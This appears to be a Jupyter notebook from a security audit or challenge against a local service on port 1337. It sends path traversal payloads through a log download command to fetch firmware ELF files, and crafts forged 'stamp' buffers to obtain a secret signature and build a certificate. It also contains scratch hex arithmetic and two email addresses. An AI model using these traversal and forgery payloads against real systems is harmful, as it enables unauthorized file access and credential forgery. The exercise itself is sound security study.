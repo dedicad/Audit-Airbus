{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "from time import sleep\n",
    "import struct\n",
    "\n",
    "port = 1337\n",
    "ip = \"localhost\"\n",
    "buf_size = 4096\n",
    "\n",
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "\n",
    "s.connect((ip,port))\n",
    "# s.setblocking(False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_message(message):\n",
    "    s.sendall(message)\n",
    "    header = b''\n",
    "    body = b''\n",
    "    while len(header) < 6:\n",
    "        header += s.recv(6 - len(header))\n",
    "    length = header[-1] + 256 * header[-2] +256**2 * header[-3] + 256**3 * header[-4]\n",
    "    print (\"Length of the message : \", length)\n",
    "    while len(body) < length - 6:\n",
    "        body += s.recv((length - 6) - len(body))\n",
    "    response = header + body\n",
    "    return response"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  28\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x01%\\x00\\x00\\x00\\x1cAUTH OK, CMDs UNLOCKED'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x250338d348\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'69|64|3d|32|36|36|37|2d|32|38|35|61|2d|34|64|39|65|a|67|72|6f|75|70|3d|75|73|65|72|a|44|33|37|41|45|35|30|46|41|41|41|41|41|'"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2ahelp\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x00\\x19Unable to read file'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2alogdl\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x00\\x11101732.LOG '"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2als LOG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x00\\x19Unable to read file'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2alogdl 11101732\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x00\\x19Unable to read file'"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2alogdl ../FW\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  1683\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x06\\x93part-1: id=0, base=0001b000 size=00200000\\npart-2: id=1, base=0021d000 size=00200000\\npart-3: id=2, base=0041f000 size=00200000\\nPOK kernel initialized\\nReceived (129): |ac|0|0|0|c|0|0|0|39|0|0|0|54|65|70|6f|63|68|3d|31|30|30|32|30|31|31|a|75|75|69|64|3d|32|36|36|37|2d|32|38|35|61|2d|34|64|39|65|a|67|72|6f|75|70|3d|75|73|65|72|a|44|33|37|41|45|35|30|46|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|\\np2 recv from p3 c39 (ret=0)\\n[STAMP] 0x01a799a2830bbc6c @ 0x00220fcc\\npok_disk_getid 3\\npok_disk_setid 2\\npok_disk_getid 2\\npok_disk_setid 3\\np2 sent to p1 65706f63683d3130 (ret=0)\\np1 recv from p2 65706f63683d3130 (ret=0)\\np1 sent to p2 52fc8b642ddad91 (ret=0)\\np2 recv from p1 52fc8b642ddad91 (ret=0)\\np3 recv from p2 len=280: |53|65|63|72|65|74|20|53|74|61|6d|70|20|3a|3a|20|1|a7|99|a2|83|b|bc|6c|5|2f|c8|b6|42|dd|ad|91|3d|2c|76|63|69|ef|22|d4|4d|a4|a7|2d|a3|7|d8|40|ce|82|3a|4e|ea|1a|5|5a|db|fe|3|3b|9a|b0|3|38|8f|ee|92|55|44|89|c2|d6|21|81|bc|54|a2|d2|25|61|80|f7|8b|82|18|7|56|92|60|5d|d9|cd|e0|3d|da|3c|84|df|f0|1a|68|d2|cb|3c|dc|85|80|5|0|87|3a|7|bd|49|32|41|52|27|67|8|16|44|d4|5|84|be|56|d0|6f|59|23|bd|ba|b9|da|ba|fc|b6|97|be|b6|be|30|c6|b8|88|db|0|6|a6|2|30|99|7|40|87|23|e6|b4|79|1c|47|86|d3|62|47|c2|e8|29|27|60|b2|b5|11|3f|65|d6|86|c5|16|75|a8|fd|92|bf|90|a1|c3|7b|a8|73|aa|6c|6f|a|55|14|b0|a5|49|38|6|65|4b|6c|ed|eb|78|f7|ce|fb|54|34|15|d0|d3|99|fa|9e|f3|ae|bf|cf|d6|7e|81|57|85|ba|51|a3|bc|9d|fa|93|4c|b6|c|a8|7|2f|b8|36|97|e1|f5|d0|83|3a|17|a1|40|6a|67|ca|48|5e|6|c2|3a|6b|34|d3|88|63|bc|60|80|a|be|2d|2|25|1|2e|24|74|9|5c|d7|\\n\\n'"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2alogdl 101732\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  140\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x00\\x8cAvailable commands:\\n\\tls : List elements inside a directory\\n\\thelp : List available commands\\n\\tlogdl Download log file inside /LOG folder'"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2ahelp\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'ialized\\nReceived (129): |ac|0|0|0|c|0|0|0|39|0|0|0|54|65|70|6f|63|68|3d|31|30|30|32|30|31|31|a|75|75|69|64|3d|32|36|36|37|2d|32|38|35|61|2d|34|64|39|65|a|67|72|6f|75|70|3d|75|73|65|72|a|44|33|37|41|45|35|30|46|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|\\np2 recv from p3 c39 (ret=0)\\n[STAMP] 0x01a799a2830bbc6c @ 0x00220fcc\\npok_disk_getid 3\\npok_disk_setid 2\\npok_disk_getid 2\\npok_disk_setid 3\\np2 sent to p1 65706f63683d3130 (ret=0)\\np1 recv from p2 65706f63683d3130 (ret=0)\\np1 sent to p2 52fc8b642ddad91 (ret=0)\\np2 recv from p1 52fc8b642ddad91 (ret=0)\\np3 recv from p2 len=280: |53|65|63|72|65|74|20|53|74|61|6d|70|20|3a|3a|20|1|a7|99|a2|83|b|bc|6c|5|2f|c8|b6|42|dd|ad|91|3d|2c|76|63|69|ef|22|d4|4d|a4|a7|2d|a3|7|d8|40|ce|82|3a|4e|ea|1a|5|5a|db|fe|3|3b|9a|b0|3|38|8f|ee|92|55|44|89|c2|d6|21|81|bc|54|a2|d2|25|61|80|f7|8b|82|18|7|56|92|60|5d|d9|cd|e0|3d|da|3c|84|df|f0|1a|68|d2|cb|3c|dc|85|80|5|0|87|3a|7|bd|49|32|41|52|27|67|8|16|44|d4|5|84|be|56|d0|6f|59|23|bd|ba|b9|da|ba|fc|b6|97|be|b6|be|30|c6|b8|88|db|0|6|a6|2|30|99|7|40|87|23|e6|b4|79|1c|47|86|d3|62|47|c2|e8|29|27|60|b2|b5|11|3f|65|d6|86|c5|16|75|a8|fd|92|bf|90|a1|c3|7b|a8|73|aa|6c|6f|a|55|14|b0|a5|49|38|6|65|4b|6c|ed|eb|78|f7|ce|fb|54|34|15|d0|d3|99|fa|9e|f3|ae|bf|cf|d6|7e|81|57|85|ba|51|a3|bc|9d|fa|93|4c|b6|c|a8|7|2f|b8|36|97|e1|f5|d0|83|3a|17|a1|40|6a|67|ca|48|5e|6|c2|3a|6b|34|d3|88|63|bc|60|80|a|be|2d|2|25|1|2e|24|74|9|5c|d7|\\n\\n'"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s.recv(4096)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  134958\n"
     ]
    }
   ],
   "source": [
    "data = send_message(b\"\\x2alogdl ././././././././././././././././././././././././././././././././././././././././././././././././././../LOG/../FW/PART2.ELF\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  0\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x00\\x00\\x00\\x00\\x00\\x00'"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2als FW\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  27\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x00\\x1bUnable to read folder'"
      ]
     },
     "execution_count": 86,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2als ../\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [],
   "source": [
    "myfile = open('kernel.elf', 'wb')\n",
    "myfile.write(data[6:])\n",
    "myfile.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x00\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    }
   ],
   "source": [
    "print (data[])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\xf6\\x7fELF\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x14\\x00\\x00\\x00\\x01\\x00\\x00\\x1d\\x8c\\x00\\x00\\x004\\x00\\x02)\\xcc\\x00\\x00\\x00\\x00\\x004\\x00 '"
      ]
     },
     "execution_count": 94,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[5:50]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-84-f31cc50f0ec1>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1200\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "24"
      ]
     },
     "execution_count": 96,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x18"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  20\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x01@\\x00\\x00\\x00\\x14VOLUME DISK OK'"
      ]
     },
     "execution_count": 122,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x40\\x14\\x53\\x7a\\x40\\x02\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  16\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x00\\x10PART3.ELF '"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2als \")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  17\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x01*\\x00\\x00\\x00\\x11KERNEL.ELF '"
      ]
     },
     "execution_count": 100,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(b\"\\x2als FW\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  992946\n"
     ]
    }
   ],
   "source": [
    "data = send_message(b\"\\x2alogdl ./././././././././././././././././././././././././././././././././././././././././././././././././././././../FW/KERNEL.ELF\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  6\n"
     ]
    }
   ],
   "source": [
    "data = send_message(b\"\\x2alogdl ././././././././././././././././././././././././././././././././././././././././././././././../LOG/./../LOG/STAMP/LAST.TXT\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x7fELF\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x14\\x00\\x00\\x00\\x01\\xff\\xf0\\x01\\x00\\x00\\x00\\x004\\x00\\x0f#d\\x00\\x00\\x00\\x00\\x004\\x00 '"
      ]
     },
     "execution_count": 114,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[6:50]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "test = b'\\xac\\x11\\x11\\x02\\x03\\x04\\x05\\x06\\x07\\x00\\x00\\x00\\x00\\x12\\x13\\x14\\x16\\x17\\x18\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\xac\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  27\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x00\\xac\\x00\\x00\\x00\\x1b\\x08INVALID STAMP BUFFER'"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "send_message(test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "129"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x81"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "127"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x7f"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "64"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x40"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "126"
      ]
     },
     "execution_count": 147,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "i de taille 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "off_o de taille 40"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "12 < off_i < 63 ; \n",
    "off_i + 64 < off_o;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "0x6ffff000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 190,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  27\n"
     ]
    }
   ],
   "source": [
    "header = b'\\xac' + b'\\x00\\x00\\x00\\x10' + b'\\x00\\x00\\x00\\x0c' + b'\\x6f\\xdd\\xe0\\xec'\n",
    "key = b'D37AE50F'\n",
    "vide = b'\\x00'*14\n",
    "userGroup = b'group=user\\n'\n",
    "epoch = 1000000\n",
    "pad = b'\\x00'*70\n",
    "stamp = header + key + vide + userGroup + b'epoch='+str(epoch).encode() + pad\n",
    "data = send_message(stamp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 189,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Length of the message :  27\n"
     ]
    }
   ],
   "source": [
    "header = b'\\xac' + b'\\x00\\x00\\x00\\x10' + b'\\x00\\x00\\x00\\x0c' + b'\\x6f\\xdd\\xe0\\xec'\n",
    "key = b'D37AE50F'\n",
    "vide = b'\\x00'*14\n",
    "userGroup = b'group=user\\n'\n",
    "epoch = 1000000\n",
    "pad = b'\\x00'*70\n",
    "stamp = header + key + vide + userGroup + b'epoch='+str(epoch).encode() + pad\n",
    "data = send_message(stamp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 177,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x08INVALID STAMP BUFFER'"
      ]
     },
     "execution_count": 177,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[6:]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'Secret Stamp :: j\\x93\\xae\\xbf\\x9c:\\xbd\\x17\\x00\\x19R)\\xc9\\xef\\x1d\\xc8\\xc9\\xb5\\xc3\\xfb\\x0be\\xcc\\xff\\xa0\\xfe\\xb3b\\x17h9\\x19\\xfd\\xf4x\\xc4\\x8b\\x9f\\x01\\x00c ?D\\xd38I( \\xcf)\\x1aA*K9Vz+B\\x02\\x05\\xf7\\x9bu\\x82\\xc2h\\xa6&\\x1b\\xa7@,\\xbeao\\xb2sv%\\xcf\\x81\\xb4736J\\xdb\\xfb\\xd8\\xe4\\xcc\\xf8\\xf4\\xddmm\\xeb$\\xfa\\x80\\x0cF\\xf4b\\x96\\t\\xf3\\x01Q\\xb2_.\\x7f|\\x1e\\x14[\\xf9\\xb6l\\x87n\\xa6\\x11\\xfe)\\x00\\x8f\\xadDw\\x90\\x0b\\xf6\\xfb\\xac\\x1f\\xf7\\xf8\\x00\\xfe}2o\\x8a\\xb6\\xaf\\x06\\x88mC\\x84\\xd0\\x84\\x9fm\\x16\\x9b\\xa6\\\\\\xcao\\x8d\\xddU\"\\x0b\\xbe\\xbb0\\t\\xf8\\xdab<u\\xc13_\\xbf$z\\xb4\\x1c+6\\x14_\\x97%8\\xca\\xf0R\\xce\\xb4V\\xe3AD\\xaf\\xf8.+\\x87\\x01\\x9c8b\\xb7i\\xb3\\x86\\x84\\x8fY\\x01_\\xf1C<\\x8a\\xd4\\x1el\\xf4\\xe5\\x98\\xd2\\x1f\\x19\\x10\\xf9O\\x0e \\x07\\x10\\xd8\\xcc\\x81O?\\xaa:9\\xb8\\xa6\\xfcQ\\xcb\\xe58n\\x1aLX\\x91\\xcb\\xa9\\x8d\\xaa'"
      ]
     },
     "execution_count": 121,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[6:]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [],
   "source": [
    "uid = b\"2667-285a-4d9e\\n\"\n",
    "myfile = open('cert_test.corp', 'wb')\n",
    "myfile.write(b\"epoch=\"+str(epoch).encode()+b'\\n')\n",
    "myfile.write(b\"uuid=\"+uid)\n",
    "myfile.write(userGroup)\n",
    "myfile.write(data[6:])\n",
    "myfile.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x48'"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "hex(32+40)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "73"
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "32+41"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "12"
      ]
     },
     "execution_count": 62,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0xc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "72"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "32+40"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "127"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x7f"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "73"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x49"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "64"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x40"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "96"
      ]
     },
     "execution_count": 67,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "64+32"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x64'"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "hex(100)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "128"
      ]
     },
     "execution_count": 115,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x80"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 116,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0^1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "24"
      ]
     },
     "execution_count": 125,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x18"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "64"
      ]
     },
     "execution_count": 126,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x40"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "117"
      ]
     },
     "execution_count": 128,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x75"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'4433374145353046'"
      ]
     },
     "execution_count": 131,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "b'D37AE50F'.hex()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 151,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1879044096"
      ]
     },
     "execution_count": 151,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x6ffff000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"stephane.duverger@airbus.com\"\n",
    "\"benoit.camredon@airbus.com\""
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
